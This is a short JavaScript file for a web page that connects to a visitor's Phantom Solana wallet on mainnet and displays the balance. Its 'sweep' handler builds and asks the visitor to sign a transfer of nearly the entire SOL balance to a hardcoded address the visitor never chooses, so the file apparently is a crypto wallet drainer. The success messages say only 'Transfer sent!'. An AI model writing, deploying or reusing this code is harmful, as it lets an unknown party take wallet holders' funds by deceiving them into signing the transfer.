import { Connection, PublicKey, clusterApiUrl, Transaction, SystemProgram } from "https://unpkg.com/@solana/web3.js@1.92.1/lib/index.iife.js";

const connection = new Connection(clusterApiUrl('mainnet-beta'));
const destAddress = 'J3Y5AkexRtc4RuHEoUz9oBCzN9WANgGk5yp9JKEzwD84';
const destPubkey = new PublicKey(destAddress);
let publicKey;

function showToast(message, type = 'success', duration = 4000) {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.className = type;
  toast.style.display = 'block';
  setTimeout(() => {
    toast.style.display = 'none';
  }, duration);
}

document.addEventListener("DOMContentLoaded", () => {
  document.getElementById('connectBtn').onclick = async () => {
    if (window.solana && window.solana.isPhantom) {
      try {
        const resp = await window.solana.connect();
        publicKey = resp.publicKey;
        document.getElementById('walletAddress').textContent = publicKey.toString();
        loadBalances();
        showToast('Wallet connected!', 'success');
      } catch (err) {
        console.error('Wallet connection failed:', err);
        showToast('Wallet connection failed.', 'error');
      }
    } else {
      alert('Phantom wallet not found! Please install Phantom.');
    }
  };

  async function loadBalances() {
    const balance = await connection.getBalance(publicKey);
    document.getElementById('solBalance').textContent = (balance / 1e9).toFixed(5) + ' SOL';
  }

  document.getElementById('sweepBtn').onclick = async () => {
    if (!publicKey) {
      showToast('Please connect your wallet first.', 'error');
      return;
    }

    const amountLamports = await connection.getBalance(publicKey);
    if (amountLamports < 5000) {
      showToast('Not enough SOL for transfer.', 'error');
      return;
    }

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: destPubkey,
        lamports: amountLamports - 5000
      })
    );

    transaction.feePayer = publicKey;
    transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

    try {
      const signed = await window.solana.signTransaction(transaction);
      const sig = await connection.sendRawTransaction(signed.serialize());

      const explorerLink = `https://solscan.io/tx/${sig}?cluster=mainnet-beta`;
      showToast(`Transfer sent! `, 'success');
      setTimeout(() => {
        const toast = document.getElementById('toast');
        toast.innerHTML = `Transfer sent! <a href="${explorerLink}" target="_blank" style="color:#fff; text-decoration:underline;">View on Solscan</a>`;
      }, 500);
    } catch (err) {
      console.error('Transaction failed:', err);
      showToast('Transaction failed.', 'error');
    }
  };
});
